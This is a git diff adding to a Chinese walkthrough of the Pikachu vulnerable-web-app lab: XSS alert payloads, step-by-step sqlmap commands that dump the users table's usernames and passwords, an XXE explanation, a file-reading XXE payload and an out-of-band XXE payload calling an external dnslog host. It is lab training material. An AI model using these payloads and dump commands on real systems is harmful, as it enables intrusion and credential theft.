@@ -158,6 +158,14 @@ javascript:alert(1)
 
 鼠标移过去就可以进行弹窗
 
+
+
+```
+1' onmouseover='alert(1)
+```
+
+
+
 ### DOM型xss-x
 
 还是一样随便输入点东西，然后发现生成了
@@ -244,6 +252,12 @@ http://127.0.0.1/vul/xss/xssblind/admin_login.php
 ```
 
 
+
+或者
+
+```
+javascript:alert(1)
+```
 
 提交点击后成功弹窗
 
@@ -383,6 +397,64 @@ id=-3 union select group_concat(username),group_concat(password) from users
 
 
 
+#### SQLMap
+
+POST提交，直接放上相应的数据运行即可。
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_id.php" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --data "id=1&submit=%E6%9F%A5%E8%AF%A2" 
+```
+
+运行结果：
+
+![image-20250225123618681](../../_media/image-20250225123618681.png)
+
+后续就是一个流程了
+
+获取库名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_id.php" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --data "id=1&submit=%E6%9F%A5%E8%AF%A2" --dbs
+```
+
+![image-20250225123820307](../../_media/image-20250225123820307.png)
+
+
+
+获取表名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_id.php" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --data "id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables
+```
+
+![image-20250225123845571](../../_media/image-20250225123845571.png)
+
+
+
+获取列名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_id.php" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --data "id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --columns
+```
+
+![image-20250225123943292](../../_media/image-20250225123943292.png)
+
+
+
+联合获取用户账号密码字段信息：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_id.php" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --data "id=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users -C "username,password" --dump
+```
+
+![image-20250225124133782](../../_media/image-20250225124133782.png)
+
+也是成功跑出了用户的账号密码
+
+后续的SQLmap使用就只贴命令而不贴结果了。
+
+
+
 ### 字符型注入(get)
 
 输入
@@ -437,6 +509,48 @@ id=-1' union select group_concat(username),group_concat(password) from users#
 
 
 
+#### SQLMap
+
+查注入点：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" 
+```
+
+
+
+爆破库名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --dbs
+```
+
+
+
+爆破表名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" -D pikachu --tables
+```
+
+
+
+爆破列名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" -D pikachu -T users --columns
+```
+
+
+
+爆破字段信息：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" -D pikachu -T users -C "username,password" --dump
+```
+
+
+
 ### 搜索型注入
 
 闭合符号为`%'`
@@ -474,6 +588,48 @@ id=-1' union select group_concat(username),group_concat(password) from users#
 ```
 
 ![image-20250123073100803](../../_media/image-20250123073100803.png)
+
+
+
+#### SQLMap
+
+查注入点：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" 
+```
+
+
+
+爆破库名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" --dbs
+```
+
+
+
+爆破表名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" -D pikachu --tables
+```
+
+
+
+爆破列名：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" -D pikachu -T users --columns
+```
+
+
+
+爆破字段信息：
+
+```
+python sqlmap.py -u "http://192.168.10.129/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --cookie="PHPSESSID=fbtqpmo4usbar76febqv2m3fug" -D pikachu -T users -C "username,password" --dump
+```
 
 
 
@@ -879,6 +1035,15 @@ O:1:"S":1:{s:4:"test";s:39:"<script>alert(document.cookie)</script>";}
 
 ## XEE
 
+XXE -"xml external entity injection"既"xml外部实体注入漏洞"。
+
+- 概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。
+
+- 现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。
+
+- 以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。
+
+
 payload如下
 
 ```xml
@@ -889,6 +1054,34 @@ payload如下
 ```
 
 ![image-20250121075900178](../../_media/image-20250121075900178.png)
+
+
+
+
+
+读取文件内容
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE ANY [
+     <!ENTITY xxe SYSTEM "PHP://filter/read=convert.base64-encode/resource=xxe_1.php"> ]>
+<a>&xxe;</a>
+```
+
+![image-20250225104937017](../../_media/image-20250225104937017.png)
+
+
+
+DNSlog外带
+
+```
+<?xml version="1.0" ?>
+<!DOCTYPE test [
+ <!ENTITY % file SYSTEM "http://saqnft.dnslog.cn">
+ %file;
+]>
+<a>&send;</a>
+```
 
 
 
